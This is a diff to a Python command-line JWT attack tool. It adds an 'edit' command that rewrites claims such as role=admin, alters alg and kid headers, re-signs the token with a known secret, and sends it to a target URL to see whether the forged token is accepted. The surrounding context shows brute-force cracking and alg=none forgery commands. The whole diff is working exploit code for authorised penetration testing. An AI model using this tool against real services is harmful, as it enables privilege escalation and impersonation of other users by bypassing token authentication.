@@ -1036,6 +1036,268 @@ def crack(token: str = typer.Option(...,"-t","--token",callback=validate_token),
     if not active: pretty_error("Add --active to confirm exploitation intent")
     hs_bruteforce(token,wordlist,jobs,gpu)
 
+@app.command(help="Edit and re-sign a JWT token with a known secret")
+def edit(
+    token: str = typer.Option(..., "-t", "--token", callback=validate_token, help="JWT token to edit"),
+    secret: str = typer.Option(..., "-s", "--secret", help="Secret key for signing"),
+    claim: List[str] = typer.Option([], "-c", "--claim", help="Claims to modify in format name=value"),
+    add_claim: List[str] = typer.Option([], "-a", "--add", help="Claims to add in format name=value"),
+    delete_claim: List[str] = typer.Option([], "-d", "--delete", help="Claims to delete (claim names)"),
+    payload: Optional[str] = typer.Option(None, "-p", "--payload", help="Replace entire payload with this JSON string"),
+    payload_file: Optional[Path] = typer.Option(None, "-pf", "--payload-file", exists=True, help="Replace payload with JSON from this file"),
+    alg: str = typer.Option(None, "--alg", help="Override signing algorithm"),
+    kid: str = typer.Option(None, "--kid", help="Set or override 'kid' header"),
+    hdr: List[str] = typer.Option([], "--header", help="Headers to add/modify in format name=value"),
+    interactive: bool = typer.Option(False, "-i", "--interactive", help="Interactively edit the payload in a text editor"),
+    output_file: bool = typer.Option(False, "--output-file", help="Save modified token to file"),
+    active: bool = typer.Option(False, "--active"),
+):
+    """
+    Edit and re-sign a JWT token with a known secret.
+    Allows adding, modifying, or deleting claims and headers,
+    or replacing the entire payload with custom JSON.
+    
+    Examples:
+        --claim exp=1700000000 --claim role=admin
+        --add custom=value --delete exp --delete nbf
+        --payload '{"sub":"admin","role":"admin"}'
+        --payload-file custom_payload.json
+        --interactive
+    """
+    if not active: pretty_error("Need --active for token editing")
+    
+    # Parse the token
+    header, payload_dict, _ = parse_jwt(token)
+    
+    # Create copies to modify
+    modified_header = header.copy()
+    modified_payload = payload_dict.copy()
+    
+    console.print("[cyan]Original Token:[/cyan]")
+    pretty_print(header, payload_dict, "...")
+    
+    # Keep track of changes for reporting
+    changes = []
+    
+    # Replace entire payload if specified
+    if payload and payload_file:
+        pretty_error("Cannot use both --payload and --payload-file together")
+    
+    if payload:
+        try:
+            new_payload = json.loads(payload)
+            changes.append(f"Replaced entire payload with custom JSON")
+            modified_payload = new_payload
+        except json.JSONDecodeError as e:
+            pretty_error(f"Invalid JSON payload: {e}")
+    
+    elif payload_file:
+        try:
+            with open(payload_file, 'r') as f:
+                new_payload = json.load(f)
+            changes.append(f"Replaced entire payload with JSON from file: {payload_file}")
+            modified_payload = new_payload
+        except json.JSONDecodeError as e:
+            pretty_error(f"Invalid JSON in payload file: {e}")
+        except Exception as e:
+            pretty_error(f"Error reading payload file: {e}")
+    
+    # Interactive editing
+    elif interactive:
+        import tempfile
+        import subprocess
+        
+        # Create a temporary file with the current payload
+        with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as temp:
+            json.dump(modified_payload, temp, indent=2)
+            temp_path = temp.name
+            
+        try:
+            # Determine which editor to use
+            editor = os.environ.get('EDITOR', 'nano')
+            
+            # Open the editor
+            console.print(f"[cyan]Opening payload in {editor}. Save and exit when done.[/cyan]")
+            result = subprocess.run([editor, temp_path])
+            
+            if result.returncode != 0:
+                pretty_error(f"Editor exited with error code {result.returncode}")
+            
+            # Read the edited file
+            with open(temp_path, 'r') as f:
+                try:
+                    edited_payload = json.load(f)
+                    modified_payload = edited_payload
+                    changes.append("Interactively edited payload")
+                except json.JSONDecodeError as e:
+                    pretty_error(f"Invalid JSON in edited payload: {e}")
+        finally:
+            # Clean up the temporary file
+            try:
+                os.unlink(temp_path)
+            except:
+                pass
+    
+    # Otherwise process individual claim modifications
+    else:
+        # Process claims to modify
+        for claim_pair in claim:
+            if "=" not in claim_pair:
+                console.print(f"[yellow]Ignoring invalid claim format: {claim_pair}[/yellow]")
+                continue
+                
+            name, value = claim_pair.split("=", 1)
+            
+            # Try to parse value as JSON if it looks like a complex type
+            if value.startswith(("{", "[", "true", "false", "null")) or value.isdigit():
+                try:
+                    parsed_value = json.loads(value)
+                    old_value = modified_payload.get(name, "not present")
+                    modified_payload[name] = parsed_value
+                    changes.append(f"Modified '{name}': {old_value} → {parsed_value}")
+                except json.JSONDecodeError:
+                    old_value = modified_payload.get(name, "not present")
+                    modified_payload[name] = value
+                    changes.append(f"Modified '{name}': {old_value} → {value}")
+            else:
+                old_value = modified_payload.get(name, "not present")
+                modified_payload[name] = value
+                changes.append(f"Modified '{name}': {old_value} → {value}")
+        
+        # Process claims to add
+        for claim_pair in add_claim:
+            if "=" not in claim_pair:
+                console.print(f"[yellow]Ignoring invalid claim format: {claim_pair}[/yellow]")
+                continue
+                
+            name, value = claim_pair.split("=", 1)
+            
+            # Skip if claim already exists
+            if name in modified_payload:
+                console.print(f"[yellow]Claim '{name}' already exists, use --claim to modify it[/yellow]")
+                continue
+                
+            # Try to parse value as JSON
+            if value.startswith(("{", "[", "true", "false", "null")) or value.isdigit():
+                try:
+                    parsed_value = json.loads(value)
+                    modified_payload[name] = parsed_value
+                    changes.append(f"Added '{name}': {parsed_value}")
+                except json.JSONDecodeError:
+                    modified_payload[name] = value
+                    changes.append(f"Added '{name}': {value}")
+            else:
+                modified_payload[name] = value
+                changes.append(f"Added '{name}': {value}")
+        
+        # Process claims to delete
+        for name in delete_claim:
+            if name in modified_payload:
+                old_value = modified_payload.pop(name)
+                changes.append(f"Deleted '{name}': {old_value}")
+            else:
+                console.print(f"[yellow]Claim '{name}' not found in payload[/yellow]")
+    
+    # Process header modifications
+    for header_pair in hdr:
+        if "=" not in header_pair:
+            console.print(f"[yellow]Ignoring invalid header format: {header_pair}[/yellow]")
+            continue
+            
+        name, value = header_pair.split("=", 1)
+        
+        # Try to parse value as JSON
+        if value.startswith(("{", "[", "true", "false", "null")) or value.isdigit():
+            try:
+                parsed_value = json.loads(value)
+                old_value = modified_header.get(name, "not present")
+                modified_header[name] = parsed_value
+                changes.append(f"Modified header '{name}': {old_value} → {parsed_value}")
+            except json.JSONDecodeError:
+                old_value = modified_header.get(name, "not present")
+                modified_header[name] = value
+                changes.append(f"Modified header '{name}': {old_value} → {value}")
+        else:
+            old_value = modified_header.get(name, "not present")
+            modified_header[name] = value
+            changes.append(f"Modified header '{name}': {old_value} → {value}")
+    
+    # Override algorithm if specified
+    if alg:
+        old_alg = modified_header.get("alg", "none")
+        modified_header["alg"] = alg
+        changes.append(f"Changed algorithm: {old_alg} → {alg}")
+    
+    # Set or override KID if specified
+    if kid:
+        old_kid = modified_header.get("kid", "not present")
+        modified_header["kid"] = kid
+        changes.append(f"Set KID: {old_kid} → {kid}")
+    
+    # Get the algorithm to use for signing
+    signing_alg = modified_header.get("alg", "HS256")
+    
+    # Sign the token
+    try:
+        encoded_jwt = jwt.encode(
+            modified_payload,
+            secret,
+            algorithm=signing_alg,
+            headers=modified_header
+        )
+        
+        # Report changes
+        if changes:
+            console.print("\n[green]Changes applied:[/green]")
+            for change in changes:
+                console.print(f"• {change}")
+        else:
+            console.print("\n[yellow]No changes were made to the token[/yellow]")
+        
+        console.print("\n[cyan]Modified Token:[/cyan]")
+        h, p, s = parse_jwt(encoded_jwt)
+        pretty_print(h, p, s[:20] + "..." if len(s) > 20 else s)
+        
+        console.print("\n[bold green]Encoded JWT:[/bold green]")
+        console.print(encoded_jwt)
+        
+        # Save to file if requested
+        if output_file:
+            save_output_to_file(encoded_jwt, "edited_token", "jwt")
+        
+        # Add to session
+        current_session.add_token(token, encoded_jwt, "edit")
+        current_session.add_finding(
+            title="JWT Token Edited",
+            description=f"Successfully edited and re-signed a JWT token with algorithm {signing_alg}",
+            severity="Info",
+            token=encoded_jwt,
+            details={"changes": changes, "algorithm": signing_alg}
+        )
+        
+        # Offer to test the token
+        if current_session.target_url:
+            test = typer.confirm("Test this token against the target URL?", default=False)
+            if test:
+                response = send_token_request(current_session.target_url, encoded_jwt, location="header")
+                if response and response.status_code < 400:
+                    console.print(f"[bold green]SUCCESS! Token accepted with status {response.status_code}[/bold green]")
+                    current_session.add_finding(
+                        title="Modified Token Accepted",
+                        description="Server accepted modified token with changed claims",
+                        severity="High",
+                        token=encoded_jwt,
+                        details={"status_code": response.status_code, "changes": changes}
+                    )
+                else:
+                    status = response.status_code if response else "Error"
+                    console.print(f"[yellow]Token rejected with status {status}[/yellow]")
+        
+        return encoded_jwt
+    
+    except Exception as e:
+        pretty_error(f"Failed to sign token: {e}")
+
 @app.command(help="Forge 'alg=none' version of a JWT.")
 def none(token: str = typer.Option(...,"-t","--token",callback=validate_token),
          active: bool = typer.Option(False,"--active")):
